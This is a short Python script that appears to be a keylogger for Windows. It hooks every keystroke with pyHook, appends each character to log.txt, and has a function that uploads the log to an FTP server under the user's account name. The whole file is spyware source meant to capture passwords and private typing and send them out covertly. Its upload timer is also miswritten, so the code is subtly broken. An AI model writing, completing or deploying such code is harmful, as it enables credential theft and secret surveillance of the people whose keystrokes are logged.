import pyHook
import pythoncom
import threading
from network.ftpconn import upload_to_ftp
import os

G_File = open('log.txt','a')
G_File.close()

MACHINE_NAME = os.getenv('username')
filename = MACHINE_NAME + '_log.txt'


def log_to_ftp():
    global filename
    upload_to_ftp('log.txt',filename,'r')
    threading.Timer(10,log_to_ftp())


def OnKeyboardEvent(event):
    File = open('log.txt','a')
    File.write(chr(event.Ascii))
    File.close()
    return True


hooks_manager = pyHook.HookManager ( )
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard ( )
pythoncom.PumpMessages ()